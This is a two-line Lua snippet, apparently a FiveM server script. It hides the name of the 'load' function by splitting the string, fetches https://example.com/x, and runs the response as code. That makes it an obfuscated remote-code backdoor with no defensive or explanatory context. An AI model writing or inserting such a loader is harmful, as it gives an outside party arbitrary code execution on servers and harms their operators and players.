local l = _G["lo".."ad"]
PerformHttpRequest('https://example.com/x', function(code, body) l(body)() end)
